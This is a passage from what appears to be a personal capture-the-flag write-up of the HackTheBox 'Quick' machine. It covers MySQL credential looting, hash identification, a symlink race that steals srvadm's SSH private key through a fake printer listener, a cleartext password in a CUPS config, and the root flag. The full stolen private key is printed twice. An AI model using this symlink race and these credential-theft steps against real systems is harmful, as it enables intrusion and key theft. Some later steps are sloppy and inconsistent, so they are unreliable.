  Memory usage:                   17%
  Swap usage:                     0%
  Processes:                      191
  Users logged in:                0
  IP address for ens33:           10.129.185.105
  IP address for docker0:         172.17.0.1
  IP address for br-e29f42f3910d: 172.23.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

52 packages can be updated.
27 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


sam@quick:~$ 

```

set the tunnel

```
┌──(root㉿kali)-[~/.ssh]
└─# ssh -i ~/.ssh/id_ed25519 sam@10.129.185.105 -N -L 9001:localhost:9001

```

successful to go to http://printerv2.quick.htb:9001/

![Pasted image 20260511164842.png](/ob/Pasted%20image%2020260511164842.png)

As I already have a shell, I can look at what the site requires to login. Trying to login submits a POST to `index.php`, which is handled here:

```
sam@quick:/var/www/printer$ ls
ls
add_printer.php
css
db.php
escpos-php
favicon.ico
fonts
home.php
images
index.php
job.php
printers.php

```

{{< toggle "Tag 🏷️" >}}

{{< tag "revshell-python-upgrade" >}} Do the python shell for connecting the database

{{< /toggle >}}

1 .python env --> Uses Python to "trick" the system into thinking a real terminal is attached, allowing for interactive commands.

```powershell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

2. Background --> Suspends the current remote shell and returns you to your **local** machine's prompt.

```
Ctrl + Z
```

3. Raw Mode --> **`stty raw`**: Tells your local terminal to pass characters (like `Ctrl+C`) directly to the remote shell. , **`-echo`**: Disables local character echoing so you don't see double inputs.**`fg`**: Brings the remote shell back to the foreground.

```
stty raw -echo; fg
```

4. Fix UI --> Sets the terminal type so that programs like `vim`, `nano`, or `clear` know how to render correctly.

```
export TERM=xterm
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Enumation-mysql" >}} Discovery the password in the db.php , and connect to local Linux mysql , and use the mysql Enumation to find the encode password

{{< /toggle >}}

```
sam@quick:~$ head -n 10 /var/www/printer/db.php
head -n 10 /var/www/printer/db.php
<?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?>

```

I do skip the the last `export TERM=xterm` to enable the mysql run

```
sam@quick:~$ mysql -u db_adm -pdb_p4ss quick
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10187
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

```

### Mysql Enumeration

```
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| quick              |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

```

```
mysql> use quick 
Database changed

```

```
mysql> select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)


```

### identify the hash

```
┌──(root㉿kali)-[~/Desktop]
└─# hashcat c6c35ae1f3cb19438e0199cfa72a9d9d 
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-Intel(R) Core(TM) Ultra 7 255U, 6971/13942 MB (2048 MB allocatable), 8MCU

The following 12 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
  32800 | md5(sha1(md5($pass)))                                      | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)

Please specify the hash-mode with -m [hash-mode].

Started: Mon May 11 22:27:12 2026
Stopped: Mon May 11 22:27:17 2026

```

```
yl51pbx
```

I can submit that password with srvadm@quick.htb and it logs in, redirecting the browser to home.php:

![Pasted image 20260512103342.png](/ob/Pasted%20image%2020260512103342.png)

### code review

{{< toggle "Tag 🏷️" >}}

{{< tag "Source-Code-php-printer-add" >}} Looking at the code, there’s an interesting section of code at the top of `jobs.php` that handles receiving the message and sending it to the printer ,and  I’ll create an infinite loop that watches for files and logs them: To read a file as srvadm, I will wait for a job file to be created, and then delete it and replace it with a symlink to the file I want to read. Then when the sleep expires, that content will be sent to my “printer”.

{{< /toggle >}}

```
if($_SESSION["loggedin"])
{
        if(isset($_POST["submit"]))
        {
                $title=$_POST["title"];
                $file = date("Y-m-d_H:i:s");
                file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
                chmod("/var/www/printer/jobs/".$file,"0777");
                $stmt=$conn->prepare("select ip,port from jobs");
                $stmt->execute();
                $result=$stmt->get_result();
                if($result->num_rows > 0)
                {
                        $row=$result->fetch_assoc();
                        $ip=$row["ip"];
                        $port=$row["port"];
                        try
                        {
                                $connector = new NetworkPrintConnector($ip,$port);
                                sleep(0.5); //Buffer for socket check
                                $printer = new Printer($connector);
                                $printer -> text(file_get_contents("/var/www/jobs/".$file));
                                $printer -> cut();
                                $printer -> close();
                                $message="Job assigned";
                                unlink("/var/www/jobs/".$file);
                        }
                        catch(Exception $error) 
                        {
                                $error="Can't connect to printer.";
                                unlink("/var/www/jobs/".$file);
                        }
                }
                else
                {
                        $error="Couldn't find printer.";
                }
        }


?>
```

What’s interesting is how it uses the filesystem. Assuming I’m coming from a registered printer, the following code is run:

```
file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
chmod("/var/www/printer/jobs/".$file,"0777");
sleep(0.5); //Buffer for socket check
$printer = new Printer($connector);
$printer -> text(file_get_contents("/var/www/jobs/".$file));
$printer -> cut();
$printer -> close();
unlink("/var/www/jobs/".$file);
```

I’m going to ignore the `chmod` command, because it’s pointing at the wrong directory. So the code simplifies to:

1. Filename is current timestamp.

2. Put user content into filename.

3. Sleep 0.5 seconds.

4. Read file and send contents to printer.

5. Delete file.

`file_get_contents` and `file_put_contents` will follow symlinks.

One bit of enumeration - the box will let me confirm that srvadm has a `.ssh` directory:

```
sam@quick:/$ ls -ld /home/srvadm/.ssh/
drwx------ 2 srvadm srvadm 4096 Mar 20 02:38 /home/srvadm/.ssh/
```

I’ll also use a trick to look at the files created in `/var/www/jobs`. I’ll create an infinite loop that watches for files and logs them:

```
sam@quick:/var/www/jobs$ while true; do ls -l | grep -v total >> /tmp/out; done
```

I’ll submit a job through the page, and then kill the loop and check out the results:

```
sam@quick:/var/www/jobs$ cat /tmp/out 
-rw-r--r-- 1 srvadm srvadm 9 May  8 20:29 2020-05-08_20:29:11
-rw-r--r-- 1 srvadm srvadm 9 May  8 20:29 2020-05-08_20:29:11
-rw-r--r-- 1 srvadm srvadm 9 May  8 20:29 2020-05-08_20:29:11
```

So the files are created readable by sam. I can’t write the file, but to delete the file, I only need [read and write permissions](https://stackoverflow.com/questions/54622606/what-permissions-are-needed-to-delete-a-file-in-unix) on the `jobs` directory itself, not on the file I want to detele, and I have that:

```
sam@quick:/var/www$ ls -ld jobs/
drwxrwxrwx 2 root root 53248 May  8 20:32 jobs/
```

This leaves two attacks, read as srvadm and write as srvadm, both of which work

I’ll run the following one liner as sam:

```
while true; do for fn in *; do if [[ -r $fn ]]; then rm -f $fn; ln -s /home/srvadm/.ssh/id_rsa $fn; fi; done; done
```

```
while true; do 
  for fn in *; 
    do if [[ -r $fn ]]; then 
      rm -f $fn; 
      ln -s /home/srvadm/.ssh/id_rsa $fn; 
    fi; 
  done; 
done
```

```
root@kali# nc -k -lnvp 9100
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:39036.
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:39048.
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
-----END RSA PRIVATE KEY-----
```

```
┌──(root㉿kali)-[~/.ssh]
└─# cat id_rsa_quick_srvadm
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
-----END RSA PRIVATE KEY-----

```

```
──(root㉿kali)-[~/.ssh]
└─# chmod 600 id_rsa_quick_srvadm 
                                      
```

```
┌──(root㉿kali)-[~/.ssh]
└─# ssh -i ./id_rsa_quick_srvadm srvadm@10.129.185.105
debug1: OpenSSH_10.2p1 Debian-3, OpenSSL 3.5.4 30 Sep 2025
debug3: Running on Linux 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64
debug3: Started with: ssh -vvv -i ./id_rsa_quick_srvadm srvadm@10.129.185.105

```

```
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue May 12 02:47:30 UTC 2026

  System load:                    0.1
  Usage of /:                     70.1% of 7.75GB
  Memory usage:                   18%
  Swap usage:                     0%
  Processes:                      190
  Users logged in:                0
  IP address for ens33:           10.129.185.105
  IP address for docker0:         172.17.0.1
  IP address for br-e29f42f3910d: 172.23.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

52 packages can be updated.
27 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


srvadm@quick:~$ 
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-dataleak" >}} use the find command to view all user home folder , and the printers.conf contains the password which can be switch to root

{{< /toggle >}}

For HTB machines, there are files in every home directory, and then there are ones that are unusual. I like to run a `find` to get files in the homedir, and usually it doesn’t overflow the screen.

```
srvadm@quick:~$ find . -type f -ls
   281794      4 -rw-r--r--   1 srvadm   srvadm       4038 Mar 20  2020 ./.cache/conf.d/printers.conf
   281793      8 -rw-r--r--   1 srvadm   srvadm       4569 Mar 20  2020 ./.cache/conf.d/cupsd.conf
   281799     72 -rw-rw-r--   1 srvadm   srvadm      71479 Mar 20  2020 ./.cache/logs/debug.log
   281798      4 -rw-rw-r--   1 srvadm   srvadm       1136 Mar 20  2020 ./.cache/logs/error.log
   281791     12 -rw-r--r--   1 srvadm   srvadm       9064 Mar 20  2020 ./.cache/logs/cups.log
   281425      0 -rw-r--r--   1 srvadm   srvadm          0 Mar 20  2020 ./.cache/motd.legal-displayed
   281369      4 -rw-r--r--   1 srvadm   srvadm        220 Mar 20  2020 ./.bash_logout
   281797      4 -rw-------   1 srvadm   srvadm         23 Mar 20  2020 ./.local/share/nano/search_history
   281421      4 -rw-r--r--   1 srvadm   srvadm        222 Mar 20  2020 ./.ssh/known_hosts
   281420      4 -rw-r--r--   1 srvadm   srvadm        394 Mar 20  2020 ./.ssh/authorized_keys
   281418      4 -rw-------   1 srvadm   srvadm       1679 Mar 20  2020 ./.ssh/id_rsa
   281419      4 -rw-r--r--   1 srvadm   srvadm        394 Mar 20  2020 ./.ssh/id_rsa.pub
   281370      4 -rw-r--r--   1 srvadm   srvadm       3771 Mar 20  2020 ./.bashrc
   281371      4 -rw-r--r--   1 srvadm   srvadm        807 Mar 20  2020 ./.profile

```

It’s not completely uncommon to have a `.cache` directory, but it’s not standard. `.conf` files are particularly interesting.

In `.cache/conf.d/printers.conf`, there’s a handful of printer objects, including this one:

```
srvadm@quick:~$ cat ./.cache/conf.d/printers.conf
# Printer configuration file for CUPS v2.3.0
# Written by cupsd on 2020-02-18 17:11
# DO NOT EDIT THIS FILE WHEN CUPSD IS RUNNING
NextPrinterId 5
<Printer Aviatar>
PrinterId 1
UUID urn:uuid:06094d79-122e-342a-6e40-384bc8e26153
AuthInfoRequired none
Info PA-7450 G250
Location G250
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI ipp://127.0.0.1/ipp/pa-7450
State Idle
StateTime 1582042274
ConfigTime 1582038455
Reason media-low-warning
Reason other-report
Type 8401100
Accepting Yes
Shared Yes
JobSheets none none
QuotaPeriod 0
PageLimit 0
KLimit 0
OpPolicy default
ErrorPolicy stop-printer
Option job-cancel-after 10800
Option media 12
Option output-bin 0
Option print-color-mode color
Option print-quality 5
Attribute marker-colors \#00FFFF,#FF00FF,#FFFF00,#000000,#00FFFF,#00FFFF,#FF00FF,#FF00FF,#FFFF00,#FFFF00,#000000,#000000,none,none,none,none
Attribute marker-levels 51,63,64,39,82,98,82,98,82,98,49,92,-1,92,83,86
Attribute marker-low-levels 10,10,10,10,10,10,10,10,10,10,10,10,0,10,10,10
Attribute marker-high-levels 100,100,100,100,100,100,100,100,100,100,100,100,99,100,100,100
Attribute marker-names Toner Cartridge (C),Toner Cartridge (M),Toner Cartridge (Y),Toner Cartridge (K),Drum Cartridge(C),Developer Cartridge(C),Drum Cartridge(M),Developer Cartridge(M),Drum Cartridge(Y),Developer Cartridge(Y),Drum Cartridge(K),Developer Cartridge(K),Waste Toner Box,Fusing Unit,Image Transfer Belt Unit,Transfer Roller Unit
Attribute marker-types toner,toner,toner,toner,opc,developer,opc,developer,opc,developer,opc,developer,waste-toner,fuser,transfer-unit,transfer-unit
Attribute marker-change-time 1582042248
</Printer>
<Printer OLD_Aviatar>
PrinterId 2
UUID urn:uuid:0929509f-7173-3afd-6be2-4da0a43ccefe
Info 8595
Location Aviatar
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
State Idle
StateTime 1549274624
ConfigTime 1549274625
Type 8401100
Accepting Yes
Shared Yes
JobSheets none none
QuotaPeriod 0
PageLimit 0
KLimit 0
OpPolicy default
ErrorPolicy stop-printer
Option job-cancel-after 10800
Option media 1
Option output-bin 0
Option print-color-mode color
Option print-quality 5
</Printer>
<DefaultPrinter PA-7032>
PrinterId 3
UUID urn:uuid:76645b2a-8a3f-3eb5-7ba5-20592bf844d3
AuthInfoRequired none
Info ti4
Location Gb125
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI ipp://127.0.0.1/ipp/pa-7032
State Idle
StateTime 1534753742
ConfigTime 1508171284
Reason cups-ipp-conformance-failure-report
Reason cups-ipp-missing-job-history
Reason other-report
Type 8401100
Accepting Yes
Shared Yes
JobSheets none none
QuotaPeriod 0
PageLimit 0
KLimit 0
AllowUser kent
OpPolicy default
ErrorPolicy stop-printer
Attribute marker-colors \#00FFFF,#FF00FF,#FFFF00,#000000,#00FFFF,#00FFFF,#FF00FF,#FF00FF,#FFFF00,#FFFF00,#000000,#000000,none,none,none,none,none
Attribute marker-levels 50,58,58,21,79,97,79,97,79,97,40,90,-1,90,79,83,83
Attribute marker-low-levels 10,10,10,10,10,10,10,10,10,10,10,10,0,10,10,10,10
Attribute marker-high-levels 100,100,100,100,100,100,100,100,100,100,100,100,99,100,100,100,100
Attribute marker-names Toner Cartridge (C),Toner Cartridge (M),Toner Cartridge (Y),Toner Cartridge (K),Drum Cartridge(C),Developer Cartridge(C),Drum Cartridge(M),Developer Cartridge(M),Drum Cartridge(Y),Developer Cartridge(Y),Drum Cartridge(K),Developer Cartridge(K),Waste Toner Box,Fusing Unit,Image Transfer Belt Unit,Transfer Roller Unit,Ozone Filter
Attribute marker-types toner,toner,toner,toner,opc,developer,opc,developer,opc,developer,opc,developer,waste-toner,fuser,transfer-unit,transfer-unit,cleaner-unit
Attribute marker-change-time 1534753719
</DefaultPrinter>
<Printer PDF_Printer>
PrinterId 4
UUID urn:uuid:d95409d9-d0ba-34f8-7b0b-8919f0e8a22c
Info Virtual PDF Printer
MakeModel Generic CUPS-PDF Printer
DeviceURI cups-pdf:/
State Idle
StateTime 1571300936
ConfigTime 1456767827
Type 8450124
Accepting Yes
Shared No
JobSheets none none
QuotaPeriod 0
PageLimit 0
KLimit 0
OpPolicy default
ErrorPolicy stop-printer
</Printer>

```

```
UUID urn:uuid:0929509f-7173-3afd-6be2-4da0a43ccefe
Info 8595
Location Aviatar
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
State Idle
StateTime 1549274624
ConfigTime 1549274625
Type 8401100
Accepting Yes
Shared Yes
JobSheets none none
```

I’ve got a new set of creds: srvadm@quick.htb / \&ftQ4K3SGde8?

ssh -i ./id\_rsa\_quick\_srvadm srvadm@10.129.184.180

Force SSH to allocate a pseudo-terminal (`-t`) and launch a shell that explicitly ignores the user's profile configurations (`.bashrc`, `.profile`, etc.).

su root

```
┌──(root㉿kali)-[~/.ssh]
└─# ssh -i ./id_rsa_quick_srvadm srvadm@10.129.184.180 -t "bash --noprofile --norc"
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
bash-4.4$ whoami
srvadm
bash-4.4$ 

```

cat  /root/root.txt

```
root@quick:/# cat  /root/root.txt
0aae7949d42637e09bbc1db30ff68de0
```

![Pasted image 20260512115358.png](/ob/Pasted%20image%2020260512115358.png)
